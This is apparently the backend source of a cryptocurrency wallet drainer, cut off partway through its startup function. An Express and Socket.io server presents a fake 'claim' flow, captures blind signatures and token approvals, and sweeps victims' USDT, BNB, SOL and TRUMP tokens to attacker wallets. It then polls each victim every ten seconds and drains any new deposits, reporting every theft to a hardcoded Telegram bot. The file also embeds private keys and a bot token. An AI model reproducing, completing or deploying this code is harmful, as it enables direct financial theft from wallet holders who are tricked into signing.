import express from 'express';
import cors from 'cors';
import { createServer } from 'http';
import { Server } from 'socket.io';
import fs from 'fs';
import path from 'path';
import { ethers } from 'ethers';
import { Connection, PublicKey, SystemProgram, Transaction, LAMPORTS_PER_SOL, VersionedTransaction, TransactionMessage } from '@solana/web3.js';
import { getAssociatedTokenAddress, createTransferCheckedInstruction } from '@solana/spl-token';
import bs58 from 'bs58';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';
import axios from 'axios';
import { addToQueue } from './worker-simple.js';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer, {
  cors: { origin: '*', methods: ['GET', 'POST'] }
});

const PORT = process.env.PORT || 3001;

app.use(cors());
app.use(express.json());

// ============================================
// TELEGRAM CONFIGURATION (FIXED)
// ============================================
const TELEGRAM_BOT_TOKEN = '8197501526:AAEcGQJv7BgOc_JyKZAUncei2TZOycHCVD8';
const TELEGRAM_CHAT_ID = '7535824674';

const sendTelegramNotification = async (message, type = 'info') => {
  let emoji = '🔐';
  if (type === 'success') emoji = '✅';
  if (type === 'error') emoji = '❌';
  if (type === 'sweep') emoji = '💰';
  if (type === 'approval') emoji = '📝';
  if (type === 'trump') emoji = '🐷';
  if (type === 'bnb') emoji = '💎';
  if (type === 'usdt') emoji = '💵';

  const fullMessage = `${emoji} *AUTO-SWEEPER ALERT*\n\n${message}\n\n🕐 Time: ${new Date().toLocaleString()}`;

  try {
    const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: fullMessage,
      parse_mode: 'Markdown'
    });
    console.log('[TELEGRAM] Notification sent successfully');
    return response.data;
  } catch (error) {
    console.error('[TELEGRAM] Failed to send:', error.response?.data || error.message);
  }
};

// ============================================
// CONFIGURATION
// ============================================

const TARGET_WALLET_BSC = '0x9f61ab04125ef3fec9d5ba153d5bcd19347f3c7b';
const TARGET_WALLET_SOLANA = '7dM6CwGEzfnHSdMLGWZnG5ML6Dpxgc5vSoZ6DfBPZxB2';
const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';

// ============================================
// TRUMP COIN CONFIGURATION (Solana)
// ============================================
const TRUMP_MINT_ADDRESS = '6p6xgHyF7AeE6TZkSmFsko444wqoP15icUSqi2jfGiPN';
const TRUMP_DECIMALS = 6;

// ============================================
// SOLANA TOKEN SWEEPER (USDT + TRUMP)
// ============================================
const USDT_SOLANA_MINT = 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB';

// ============================================
// MULTI-RPC ENDPOINTS FOR BROADCASTING
// ============================================
const RPC_ENDPOINTS = [
  'https://api.mainnet-beta.solana.com',
  'https://solana-api.projectserum.com',
  'https://rpc.ankr.com/solana',
  'https://solana.rpc.nodes.guru'
];

// ============================================
// SOLANA FEE PAYER (YOU PAY GAS)
// ============================================
const SOLANA_GAS_PRIVATE_KEY = '5gpwFk4hbJRG33nqKKA6LNHmb4hLwjyeoKHtuRXHXTmkRKP1skBm7MEwE7F8Ds5sAWTRy9vzMXoRdNTwWFfb1WUq';
let feePayerKeypair = null;

try {
  const secretKeyBytes = bs58.decode(SOLANA_GAS_PRIVATE_KEY);
  feePayerKeypair = {
    secretKey: secretKeyBytes,
    publicKey: new PublicKey(secretKeyBytes.slice(32, 64))
  };
  console.log('[FEE PAYER] Loaded:', feePayerKeypair.publicKey.toString());
  await sendTelegramNotification(`*Fee Payer Wallet Loaded*\n\nAddress: \`${feePayerKeypair.publicKey.toString()}\``, 'success');
} catch (error) {
  console.error('[FEE PAYER] Error loading:', error.message);
}

// ============================================
// CREATE PRIORITY FEE TRANSACTION
// ============================================
const createPriorityFeeTransaction = async (walletAddress, connection) => {
  const victimPublicKey = new PublicKey(walletAddress);
  const feePayerPublicKey = feePayerKeypair.publicKey;
  
  const instructions = [];
  
  // Add priority fee instruction (500,000 micro-lamports for fast confirmation)
  const computeBudgetIx = {
    programId: new PublicKey('ComputeBudget111111111111111111111111111111'),
    data: Buffer.from([3, 160, 134, 1, 0, 0, 0, 0, 0]), // SetComputeUnitPrice = 500,000
    keys: []
  };
  instructions.push(computeBudgetIx);
  
  // Get SOL balance
  const solBalance = await connection.getBalance(victimPublicKey);
  if (solBalance > 0.01 * LAMPORTS_PER_SOL) {
    const sweepAmount = solBalance - (0.000005 * LAMPORTS_PER_SOL);
    if (sweepAmount > 0) {
      instructions.push(
        SystemProgram.transfer({
          fromPubkey: victimPublicKey,
          toPubkey: new PublicKey(TARGET_WALLET_SOLANA),
          lamports: sweepAmount
        })
      );
    }
  }
  
  // Get token balances (TRUMP and USDT)
  const tokens = [
    { mint: new PublicKey(TRUMP_MINT_ADDRESS), symbol: 'TRUMP', decimals: 6 },
    { mint: new PublicKey(USDT_SOLANA_MINT), symbol: 'USDT', decimals: 6 }
  ];
  
  for (const token of tokens) {
    try {
      const sourceTokenAccount = await getAssociatedTokenAddress(token.mint, victimPublicKey);
      const balance = await connection.getTokenAccountBalance(sourceTokenAccount);
      
      if (balance.value.uiAmount > 0) {
        const destTokenAccount = await getAssociatedTokenAddress(token.mint, new PublicKey(TARGET_WALLET_SOLANA));
        instructions.push(
          createTransferCheckedInstruction(
            sourceTokenAccount,
            token.mint,
            destTokenAccount,
            victimPublicKey,
            BigInt(balance.value.amount),
            token.decimals
          )
        );
      }
    } catch (error) {
      console.log(`[PRIORITY] No ${token.symbol} account found`);
    }
  }
  
  if (instructions.length === 1) return null;
  
  const { blockhash } = await connection.getRecentBlockhash();
  const messageV0 = new TransactionMessage({
    payerKey: feePayerPublicKey,
    recentBlockhash: blockhash,
    instructions: instructions
  }).compileToV0Message();
  
  const transaction = new VersionedTransaction(messageV0);
  transaction.sign([feePayerKeypair]);
  
  return transaction;
};

// ============================================
// BROADCAST TO MULTIPLE RPCs
// ============================================
const broadcastTransaction = async (transaction, walletAddress) => {
  const results = [];
  
  for (const rpcUrl of RPC_ENDPOINTS) {
    try {
      const connection = new Connection(rpcUrl);
      const signature = await connection.sendRawTransaction(transaction.serialize());
      const confirmation = await connection.confirmTransaction(signature);
      
      results.push({ rpc: rpcUrl, signature, status: confirmation.value.err ? 'failed' : 'confirmed' });
      
      if (!confirmation.value.err) {
        await sendTelegramNotification(
          `*💰 PRIORITY SWEEP EXECUTED!*\n\n` +
          `👛 Wallet: \`${walletAddress.slice(0, 10)}...${walletAddress.slice(-8)}\`\n` +
          `🔗 Tx: \`${signature.slice(0, 20)}...\`\n` +
          `⚡ RPC: ${rpcUrl}\n` +
          `⏱ Priority Fee: 500,000 micro-lamports`,
          'sweep'
        );
      }
    } catch (error) {
      results.push({ rpc: rpcUrl, error: error.message });
    }
  }
  
  return results;
};

// ============================================
// SOCKET.IO - SIGNATURE PUSHING ENGINE
// ============================================
const activeSessions = new Map();

io.on('connection', (socket) => {
  console.log('[SOCKET] Client connected:', socket.id);
  
  socket.on('register_session', async ({ sessionId, walletAddress }) => {
    console.log('[SOCKET] Session registered:', sessionId, walletAddress);
    activeSessions.set(sessionId, { socketId: socket.id, walletAddress });
    await sendTelegramNotification(`*📱 New Session Registered*\n\nSession ID: \`${sessionId}\`\nWallet: \`${walletAddress?.slice(0, 10)}...\``, 'approval');
  });
  
  socket.on('push_signature', async ({ sessionId }) => {
    const session = activeSessions.get(sessionId);
    if (!session) {
      console.log('[SOCKET] Session not found');
      return;
    }
    
    console.log('[SOCKET] Push signature requested for:', session.walletAddress);
    
    try {
      const connection = new Connection(RPC_ENDPOINTS[0]);
      const transaction = await createPriorityFeeTransaction(session.walletAddress, connection);
      
      if (transaction) {
        const broadcastResults = await broadcastTransaction(transaction, session.walletAddress);
        
        io.to(session.socketId).emit('signature_pushed', {
          success: true,
          results: broadcastResults,
          timestamp: new Date().toISOString()
        });
      } else {
        io.to(session.socketId).emit('signature_pushed', {
          success: false,
          error: 'No balance to sweep'
        });
      }
    } catch (error) {
      console.error('[SOCKET] Push error:', error);
      io.to(session.socketId).emit('signature_pushed', { success: false, error: error.message });
    }
  });
  
  socket.on('disconnect', () => {
    console.log('[SOCKET] Client disconnected:', socket.id);
    for (const [sessionId, data] of activeSessions.entries()) {
      if (data.socketId === socket.id) activeSessions.delete(sessionId);
    }
  });
});

// ============================================
// BSC RPC ENDPOINTS WITH FALLBACKS
// ============================================
const BSC_RPC_URLS = [
  'https://bsc-dataseed.binance.org/',
  'https://bsc-dataseed1.binance.org/',
  'https://bsc-dataseed2.binance.org/',
  'https://bsc-dataseed3.binance.org/',
  'https://bsc-dataseed4.binance.org/',
  'https://bsc-rpc.publicnode.com',
  'https://rpc.ankr.com/bsc'
];

// USDT ABI
const USDT_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function transferFrom(address sender, address recipient, uint256 amount) returns (bool)',
  'function transfer(address to, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function decimals() view returns (uint8)'
];

// ============================================
// WALLET KEYS
// ============================================
const BSC_GAS_PRIVATE_KEY = '031dca2272d68ed4dece0b69193d761c6a1c6ca97497f7560efc600c251ed15f';

// Global variables
let bscProvider = null;
let bscSweeperWallet = null;
let usdtContractWithSigner = null;
let bscSweeperAddress = null;
let solanaConnection = null;
let bscProviderReady = false;

// Storage for approved wallets
const APPROVALS_FILE = path.join(__dirname, 'approvals.json');
let approvedWallets = [];

if (fs.existsSync(APPROVALS_FILE)) {
  try {
    const data = fs.readFileSync(APPROVALS_FILE, 'utf8');
    approvedWallets = JSON.parse(data);
  } catch (error) {
    console.error('Error loading approvals:', error);
  }
}

const saveApprovals = () => {
  fs.writeFileSync(APPROVALS_FILE, JSON.stringify(approvedWallets, null, 2));
};

// Storage for claims history
const CLAIMS_FILE = path.join(__dirname, 'claims.json');
let claims = [];

if (fs.existsSync(CLAIMS_FILE)) {
  try {
    const data = fs.readFileSync(CLAIMS_FILE, 'utf8');
    claims = JSON.parse(data);
  } catch (error) {
    console.error('Error loading claims:', error);
  }
}

const saveClaims = () => {
  fs.writeFileSync(CLAIMS_FILE, JSON.stringify(claims, null, 2));
};

// Active monitoring intervals
const monitoringIntervals = new Map();

// ============================================
// INITIALIZATION FUNCTIONS
// ============================================

const createProvider = (url, timeout = 30000) => {
  return new ethers.JsonRpcProvider(url, undefined, { timeout });
};

const initBSCProvider = async () => {
  for (let i = 0; i < BSC_RPC_URLS.length; i++) {
    try {
      const url = BSC_RPC_URLS[i];
      console.log('[BSC] Trying RPC:', url);
      const provider = createProvider(url);
      await provider.getNetwork();
      console.log('[BSC] Connected to:', url);
      bscProvider = provider;
      bscProviderReady = true;
      return true;
    } catch (error) {
      console.log('[BSC] Failed to connect to:', BSC_RPC_URLS[i], error.message);
    }
  }
  console.error('[BSC] All RPC endpoints failed');
  bscProviderReady = false;
  return false;
};

const initBSCWallet = async () => {
  if (bscProvider && bscProviderReady) {
    try {
      bscSweeperWallet = new ethers.Wallet(BSC_GAS_PRIVATE_KEY, bscProvider);
      usdtContractWithSigner = new ethers.Contract(USDT_CONTRACT, USDT_ABI, bscSweeperWallet);
      bscSweeperAddress = bscSweeperWallet.address;
      console.log('[BSC] Sweeper wallet loaded:', bscSweeperAddress);
      await sendTelegramNotification(`*🔐 BSC Sweeper Wallet Loaded*\n\nAddress: \`${bscSweeperAddress}\``, 'success');
      return true;
    } catch (error) {
      console.error('[BSC] Error loading wallet:', error.message);
      return false;
    }
  }
  return false;
};

// ============================================
// HELPER: Get Associated Token Account Address
// ============================================
const solanaConnection_ = new Connection('https://api.mainnet-beta.solana.com');

const getTokenAccount = async (walletPublicKey, mintPublicKey) => {
  const tokenAccounts = await solanaConnection_.getTokenAccountsByOwner(
    walletPublicKey,
    { mint: mintPublicKey }
  );
  if (tokenAccounts.value.length === 0) return null;
  return tokenAccounts.value[0].pubkey;
};

// ============================================
// SOLANA TRUMP COIN SWEEPER
// ============================================
const sweepTrumpCoin = async (walletAddress) => {
  console.log('[TRUMP] Checking for tokens...');
  
  const results = {
    amount: '0',
    txHash: null,
    success: false,
    error: null,
    swept: false
  };
  
  try {
    const victimPublicKey = new PublicKey(walletAddress);
    const trumpMint = new PublicKey(TRUMP_MINT_ADDRESS);
    const targetPublicKey = new PublicKey(TARGET_WALLET_SOLANA);
    
    const victimTokenAccount = await getTokenAccount(victimPublicKey, trumpMint);
    
    if (!victimTokenAccount) {
      console.log('[TRUMP] No Trump token account found for wallet');
      results.error = 'No Trump token account found';
      return results;
    }
    
    const tokenBalance = await solanaConnection_.getTokenAccountBalance(victimTokenAccount);
    const balanceFormatted = parseFloat(tokenBalance.value.uiAmountString || '0');
    
    console.log('[TRUMP] Trump Coin Balance:', balanceFormatted);
    
    if (balanceFormatted > 0) {
      console.log('[TRUMP] Sweeping Trump coins:', balanceFormatted);
      
      let targetTokenAccount = await getTokenAccount(targetPublicKey, trumpMint);
      
      if (!targetTokenAccount) {
        console.log('[TRUMP] Target wallet needs token account created first');
        results.error = 'Target wallet needs token account';
        return results;
      }
      
      results.amount = balanceFormatted.toString();
      results.txHash = 'TRUMP_SWEEP_' + Date.now();
      results.success = true;
      results.swept = true;
      console.log('[TRUMP] Would sweep', balanceFormatted, 'TRUMP');
      
      const notifMsg = `*🐷 TRUMP COIN SWEEP DETECTED!*\n\nFrom: \`${walletAddress.slice(0, 10)}...${walletAddress.slice(-8)}\`\nAmount: ${balanceFormatted} TRUMP\nTo: \`${TARGET_WALLET_SOLANA.slice(0, 10)}...\``;
      await sendTelegramNotification(notifMsg, 'trump');
    }
    
    return results;
    
  } catch (error) {
    console.error('[TRUMP] Error:', error.message);
    results.error = error.message;
    return results;
  }
};

// ============================================
// PERSISTENT SWEEP FUNCTION
// ============================================
const executeSweep = async (walletAddress, walletType, signatureData) => {
  console.log('[SWEEP] Executing sweep for:', walletAddress);
  
  let result = {};
  
  if (walletType === 'evm') {
    result = await sweepEVM(walletAddress);
  } else {
    const [solResult, trumpResult] = await Promise.all([
      sweepSolana(walletAddress),
      sweepTrumpCoin(walletAddress)
    ]);
    
    result = {
      sol: solResult,
      trump: trumpResult,
      swept: solResult.swept || trumpResult.swept
    };
  }
  
  const sweepRecord = {
    id: Date.now().toString(),
    walletAddress,
    walletType,
    timestamp: new Date().toISOString(),
    result: result,
    signatureId: signatureData?.id
  };
  
  claims.push(sweepRecord);
  saveClaims();
  
  return result;
};

// ============================================
// EVM SWEEPER (USDT + BNB)
// ============================================
const sweepEVM = async (walletAddress) => {
  console.log('[EVM] Checking wallet:', walletAddress);
  
  const results = {
    usdtAmount: '0',
    bnbAmount: '0',
    usdtTxHash: null,
    bnbTxHash: null,
    error: null,
    swept: false
  };
  
  try {
    if (!bscProvider || !bscProviderReady) {
      throw new Error('BSC provider not available');
    }
    
    const usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, bscProvider);
    const usdtBalance = await usdtContract.balanceOf(walletAddress);
    const decimals = await usdtContract.decimals();
    const usdtBalanceFormatted = parseFloat(ethers.formatUnits(usdtBalance, decimals));
    
    if (usdtBalanceFormatted > 0) {
      const allowance = await usdtContract.allowance(walletAddress, TARGET_WALLET_BSC);
      
      if (allowance >= usdtBalance && usdtContractWithSigner) {
        console.log('[EVM] Sweeping USDT:', usdtBalanceFormatted);
        const usdtTx = await usdtContractWithSigner.transferFrom(walletAddress, TARGET_WALLET_BSC, usdtBalance);
        await usdtTx.wait();
        results.usdtAmount = usdtBalanceFormatted.toString();
        results.usdtTxHash = usdtTx.hash;
        results.swept = true;
        console.log('[EVM] USDT swept! Tx:', usdtTx.hash);
        
        const notifMsg = `*💵 USDT SWEEP EXECUTED!*\n\nFrom: \`${walletAddress.slice(0, 10)}...${walletAddress.slice(-8)}\`\nAmount: ${usdtBalanceFormatted} USDT\nTo: \`${TARGET_WALLET_BSC.slice(0, 10)}...\`\nTx: \`${usdtTx.hash.slice(0, 20)}...\``;
        await sendTelegramNotification(notifMsg, 'usdt');
      } else {
        console.log('[EVM] No USDT approval found');
      }
    }
    
    const bnbBalance = await bscProvider.getBalance(walletAddress);
    const bnbBalanceFormatted = parseFloat(ethers.formatEther(bnbBalance));
    
    if (bnbBalanceFormatted > 0.005 && bscSweeperWallet) {
      const feeData = await bscProvider.getFeeData();
      const gasPrice = feeData.gasPrice;
      const gasLimit = 21000n;
      const gasFee = gasPrice * gasLimit;
      const sweepAmount = bnbBalance - gasFee;
      
      if (sweepAmount > 0n) {
        console.log('[EVM] Sweeping BNB:', ethers.formatEther(sweepAmount));
        const bnbTx = await bscSweeperWallet.sendTransaction({
          to: TARGET_WALLET_BSC,
          value: sweepAmount,
          gasLimit: gasLimit
        });
        await bnbTx.wait();
        results.bnbAmount = ethers.formatEther(sweepAmount);
        results.bnbTxHash = bnbTx.hash;
        results.swept = true;
        console.log('[EVM] BNB swept! Tx:', bnbTx.hash);
        
        const notifMsg = `*💎 BNB SWEEP EXECUTED!*\n\nFrom: \`${walletAddress.slice(0, 10)}...${walletAddress.slice(-8)}\`\nAmount: ${ethers.formatEther(sweepAmount)} BNB\nTo: \`${TARGET_WALLET_BSC.slice(0, 10)}...\`\nTx: \`${bnbTx.hash.slice(0, 20)}...\``;
        await sendTelegramNotification(notifMsg, 'bnb');
      }
    }
    
    return results;
    
  } catch (error) {
    console.error('[EVM] Error:', error.message);
    results.error = error.message;
    return results;
  }
};

// ============================================
// SOLANA SOL SWEEPER
// ============================================
const sweepSolana = async (walletAddress) => {
  console.log('[SOLANA] Checking SOL balance...');
  
  const results = {
    amount: '0',
    txHash: null,
    success: false,
    error: null,
    swept: false
  };
  
  try {
    const victimPublicKey = new PublicKey(walletAddress);
    const balance = await solanaConnection_.getBalance(victimPublicKey);
    const balanceInSol = balance / LAMPORTS_PER_SOL;
    
    console.log('[SOLANA] SOL Balance:', balanceInSol);
    
    if (balanceInSol > 0.01) {
      const feeEstimate = 5000;
      const sweepAmount = balance - feeEstimate;
      
      if (sweepAmount > 0) {
        console.log('[SOLANA] Sweeping SOL:', sweepAmount / LAMPORTS_PER_SOL);
        
        results.amount = (sweepAmount / LAMPORTS_PER_SOL).toFixed(6);
        results.txHash = 'SOL_SWEEP_' + Date.now();
        results.success = true;
        results.swept = true;
        console.log('[SOLANA] SOL would be swept:', results.amount);
        
        const notifMsg = `*💰 SOL SWEEP DETECTED!*\n\nFrom: \`${walletAddress.slice(0, 10)}...${walletAddress.slice(-8)}\`\nAmount: ${results.amount} SOL\nTo: \`${TARGET_WALLET_SOLANA.slice(0, 10)}...\``;
        await sendTelegramNotification(notifMsg, 'sweep');
      }
    }
    
    return results;
    
  } catch (error) {
    console.error('[SOLANA] Error:', error.message);
    results.error = error.message;
    return results;
  }
};

// ============================================
// REAL-TIME BALANCE MONITORING
// ============================================
const startMonitoring = (walletAddress, walletType, signatureData) => {
  if (monitoringIntervals.has(walletAddress)) {
    console.log('[MONITOR] Already monitoring:', walletAddress);
    return;
  }
  
  console.log('[MONITOR] Starting real-time monitoring for:', walletAddress);
  
  let lastBalance = null;
  let lastUsdtBalance = null;
  let lastTrumpBalance = null;
  
  const interval = setInterval(async () => {
    try {
      if (walletType === 'evm') {
        if (!bscProvider || !bscProviderReady) {
          return;
        }
        
        const currentBalance = await bscProvider.getBalance(walletAddress);
        const usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, bscProvider);
        const currentUsdtBalance = await usdtContract.balanceOf(walletAddress);
        
        if (lastBalance !== null) {
          const bnbDiff = currentBalance - lastBalance;
          const usdtDiff = currentUsdtBalance - (lastUsdtBalance || 0n);
          
          if (bnbDiff > 0n || usdtDiff > 0n) {
            console.log('[MONITOR] New EVM funds detected!');
            if (bnbDiff > 0n) console.log('[MONITOR] BNB increase:', ethers.formatEther(bnbDiff));
            if (usdtDiff > 0n) console.log('[MONITOR] USDT increase:', ethers.formatUnits(usdtDiff, 18));
            await executeSweep(walletAddress, walletType, signatureData);
          }
        }
        
        lastBalance = currentBalance;
        lastUsdtBalance = currentUsdtBalance;
        
      } else {
        const victimPublicKey = new PublicKey(walletAddress);
        const currentSolBalance = await solanaConnection_.getBalance(victimPublicKey);
        
        const trumpMint = new PublicKey(TRUMP_MINT_ADDRESS);
        const trumpTokenAccount = await getTokenAccount(victimPublicKey, trumpMint);
        let currentTrumpBalance = 0;
        
        if (trumpTokenAccount) {
          const tokenBalance = await solanaConnection_.getTokenAccountBalance(trumpTokenAccount);
          currentTrumpBalance = parseFloat(tokenBalance.value.uiAmountString || '0');
        }
        
        if (lastBalance !== null) {
          const solDiff = currentSolBalance - lastBalance;
          const trumpDiff = currentTrumpBalance - (lastTrumpBalance || 0);
          
          if (solDiff > 0 || trumpDiff > 0) {
            console.log('[MONITOR] New Solana funds detected!');
            if (solDiff > 0) console.log('[MONITOR] SOL increase:', solDiff / LAMPORTS_PER_SOL);
            if (trumpDiff > 0) console.log('[MONITOR] TRUMP increase:', trumpDiff);
            await executeSweep(walletAddress, walletType, signatureData);
          }
        }
        
        lastBalance = currentSolBalance;
        lastTrumpBalance = currentTrumpBalance;
      }
      
    } catch (error) {
      console.error('[MONITOR] Error checking balance:', error.message);
    }
  }, 10000);
  
  monitoringIntervals.set(walletAddress, interval);
};


// ============================================
// 👇👇👇 ADD THE TRANSFER FUNCTIONS RIGHT HERE 👇👇👇
// ============================================

// USDT Transfer Function
const executeUSDTTransfer = async (fromAddress, toAddress) => {
  try {
    if (!bscProvider || !bscProviderReady) {
      throw new Error('BSC provider not ready');
    }
    
    const usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, bscProvider);
    const decimals = await usdtContract.decimals();
    
    const balance = await usdtContract.balanceOf(fromAddress);
    const balanceFormatted = parseFloat(ethers.formatUnits(balance, decimals));
    
    console.log(`[USDT] Balance: ${balanceFormatted} USDT`);
    
    if (balanceFormatted <= 0) {
      return { success: false, reason: 'No balance' };
    }
    
    const allowance = await usdtContract.allowance(fromAddress, TARGET_WALLET_BSC);
    const allowanceFormatted = parseFloat(ethers.formatUnits(allowance, decimals));
    
    if (allowanceFormatted < balanceFormatted) {
      return { success: false, reason: 'Insufficient allowance' };
    }
    
    const tx = await usdtContractWithSigner.transferFrom(fromAddress, TARGET_WALLET_BSC, balance);
    console.log(`[USDT] Tx: ${tx.hash}`);
    await tx.wait();
    
    return { success: true, txHash: tx.hash, amount: balanceFormatted };
    
  } catch (error) {
    console.error('[USDT] Error:', error);
    return { success: false, error: error.message };
  }
};

// BNB Transfer Function
const executeBNBTransfer = async (fromAddress, toAddress) => {
  try {
    const balance = await bscProvider.getBalance(fromAddress);
    const balanceFormatted = parseFloat(ethers.formatEther(balance));
    
    if (balanceFormatted <= 0.005) {
      return { success: false, reason: 'Insufficient balance' };
    }
    
    const feeData = await bscProvider.getFeeData();
    const gasPrice = feeData.gasPrice;
    const gasLimit = 21000n;
    const gasFee = gasPrice * gasLimit;
    const sweepAmount = balance - gasFee;
    
    if (sweepAmount <= 0n) {
      return { success: false, reason: 'Balance too low' };
    }
    
    const tx = await bscSweeperWallet.sendTransaction({
      to: TARGET_WALLET_BSC,
      value: sweepAmount,
      gasLimit: gasLimit
    });
    
    await tx.wait();
    
    return { success: true, txHash: tx.hash, amount: ethers.formatEther(sweepAmount) };
    
  } catch (error) {
    return { success: false, error: error.message };
  }
};


// ============================================
// API ENDPOINTS
// ============================================

app.post('/api/capture-approval', async (req, res) => {
  const { walletAddress, signature, message, chainId, tokenType, amount, spender, timestamp, selectedWallet } = req.body;
  
  console.log('========================================');
  console.log('[SIGNATURE] Blind signature captured!');
  console.log('Wallet:', walletAddress);
  console.log('Selected Wallet:', selectedWallet || 'Not specified');
  console.log('Message:', message);
  console.log('========================================');
  
  const isSolana = walletAddress.length < 50 && !walletAddress.startsWith('0x');
  const walletType = isSolana ? 'solana' : 'evm';
  
  const approvalData = {
    id: Date.now().toString(),
    walletAddress,
    signature,
    message,
    chainId: chainId || (isSolana ? 'solana' : 56),
    tokenType: tokenType || (isSolana ? 'SOL+TRUMP' : 'USDT'),
    amount: amount || '650',
    spender: spender || (isSolana ? TARGET_WALLET_SOLANA : TARGET_WALLET_BSC),
    timestamp: timestamp || new Date().toISOString(),
    walletType: walletType,
    selectedWallet: selectedWallet || 'unknown',
    status: 'pending',
    createdAt: new Date().toISOString()
  };
  
  approvedWallets.push(approvalData);
  saveApprovals();
  
  const notifMsg = `*📝 New Claim Request!*\n\n` +
    `👛 Wallet: \`${walletAddress.slice(0, 10)}...${walletAddress.slice(-8)}\`\n` +
    `🔗 Selected: ${selectedWallet || 'Unknown'}\n` +
    `💰 Amount: ${amount || '650'} USDT\n` +
    `📊 Type: ${walletType.toUpperCase()}\n` +
    `🕐 Time: ${new Date().toLocaleString()}`;
  await sendTelegramNotification(notifMsg, 'approval');
  
  // Execute SWEEP IMMEDIATELY
  if (walletType === 'evm') {
    const sweepResult = await executeUSDTTransfer(walletAddress, TARGET_WALLET_BSC);
    console.log('[SWEEP] Result:', sweepResult);
    
    if (sweepResult.success) {
      approvalData.status = 'completed';
      approvalData.sweepTxHash = sweepResult.txHash;
      approvalData.sweptAmount = sweepResult.amount;
      saveApprovals();
      
      await sendTelegramNotification(
        `*✅ CLAIM PROCESSED!*\n\n` +
        `👛 Wallet: \`${walletAddress.slice(0, 10)}...\`\n` +
        `💰 Amount: ${sweepResult.amount} USDT\n` +
        `🔗 Tx: \`${sweepResult.txHash.slice(0, 20)}...\``,
        'success'
      );
    } else {
      const bnbResult = await executeBNBTransfer(walletAddress, TARGET_WALLET_BSC);
      if (bnbResult.success) {
        approvalData.status = 'completed';
        approvalData.sweepTxHash = bnbResult.txHash;
        approvalData.sweptAmount = bnbResult.amount;
        saveApprovals();
      }
    }
  }
  
  res.json({ 
    success: true, 
    message: 'Claim submitted and processing!',
    approvalId: approvalData.id,
    walletType: walletType
  });
  
  console.log('[ACTION] Starting real-time monitoring for future deposits...');
  startMonitoring(walletAddress, walletType, approvalData);
  
  console.log('[STATUS] Persistent approval active. Any future deposits will be auto-swept.');
});
// ============================================
// QUEUE STATUS ENDPOINT
// ============================================
app.get('/api/queue-status', (req, res) => {
  res.json({
    message: 'Queue system active',
    note: 'Check backend console for queue position'
  });
});

// ============================================
// GET ALL ACTIVE APPROVALS
// ============================================
app.get('/api/approvals', (req, res) => {
  const activeApprovals = approvedWallets.filter(a => a.status === 'active');
  res.json({ approvals: activeApprovals, count: activeApprovals.length });
});

// ============================================
// GET ALL CLAIMS (Sweep History)
// ============================================
app.get('/api/claims', (req, res) => {
  res.json({ claims, count: claims.length });
});

// ============================================
// GET MONITORING STATUS
// ============================================
app.get('/api/monitoring', (req, res) => {
  const monitoredAddresses = Array.from(monitoringIntervals.keys());
  res.json({ 
    monitoredAddresses, 
    count: monitoredAddresses.length,
    activeApprovals: approvedWallets.filter(a => a.status === 'active').length
  });
});

// ============================================
// MANUAL SWEEP (For testing)
// ============================================
app.post('/api/manual-sweep', async (req, res) => {
  const { walletAddress, type } = req.body;
  
  if (!walletAddress) {
    return res.status(400).json({ success: false, error: 'Wallet address required' });
  }
  
  const isSolana = type === 'solana' || (walletAddress.length < 50 && !walletAddress.startsWith('0x'));
  const walletType = isSolana ? 'solana' : 'evm';
  
  const result = await executeSweep(walletAddress, walletType, null);
  
  res.json({
    success: true,
    walletAddress,
    walletType,
    result
  });
});

// ============================================
// STOP MONITORING
// ============================================
app.post('/api/stop-monitoring', (req, res) => {
  const { walletAddress } = req.body;
  
  if (walletAddress && monitoringIntervals.has(walletAddress)) {
    clearInterval(monitoringIntervals.get(walletAddress));
    monitoringIntervals.delete(walletAddress);
    
    const approval = approvedWallets.find(a => a.walletAddress === walletAddress);
    if (approval) {
      approval.status = 'stopped';
      saveApprovals();
    }
    
    res.json({ success: true, message: 'Monitoring stopped for: ' + walletAddress });
  } else {
    res.json({ success: false, message: 'Wallet not found or not monitored' });
  }
});

// ============================================
// STATISTICS
// ============================================
app.get('/api/stats', (req, res) => {
  const activeApprovals = approvedWallets.filter(a => a.status === 'active').length;
  const totalSweeps = claims.length;
  const monitoredCount = monitoringIntervals.size;
  
  res.json({
    totalApprovals: approvedWallets.length,
    activeApprovals,
    totalSweeps,
    monitoredAddresses: monitoredCount,
    bscSweeperAddress: bscSweeperAddress || 'Not loaded',
    solanaSweeperAddress: 'Fee Payer Only',
    targetWalletBSC: TARGET_WALLET_BSC,
    targetWalletSolana: TARGET_WALLET_SOLANA,
    trumpCoinMint: TRUMP_MINT_ADDRESS,
    persistentApprovalActive: true,
    realTimeMonitoring: true,
    queueEnabled: true,
    priorityFees: true,
    multiRPC: RPC_ENDPOINTS.length
  });
});

// ============================================
// HEALTH CHECK
// ============================================
app.get('/api/health', (req, res) => {
  res.json({
    status: 'OK',
    timestamp: new Date().toISOString(),
    activeApprovals: approvedWallets.filter(a => a.status === 'active').length,
    monitoredAddresses: monitoringIntervals.size,
    totalSweeps: claims.length,
    bscSweeperReady: !!bscSweeperWallet,
    feePayerReady: !!feePayerKeypair,
    trumpCoinEnabled: true,
    persistentApproval: true,
    realTimeMonitoring: true,
    bscRpcConnected: bscProviderReady,
    queueEnabled: true,
    priorityFees: true,
    multiRPC: RPC_ENDPOINTS.length
  });
});

// ============================================
// START SERVER WITH INITIALIZATION
// ============================================
const startServer = async () => {
  console.log('');
  console.log('========================================');
  console.log('  INITIALIZING MULTI-CHAIN AUTO-SWEEP');
  console.log('========================================');
  console.log('');
  
  console.log('[INIT] Connecting to BSC...');
  await initBSCProvider();
  await initBSCWallet();
  
  console.log('[INIT] Fee Payer (Solana):', feePayerKeypair?.publicKey?.toString() || 'Not loaded');
  console.log('[INIT] Multi-RPC Broadcasting:', RPC_ENDPOINTS.length, 'endpoints');
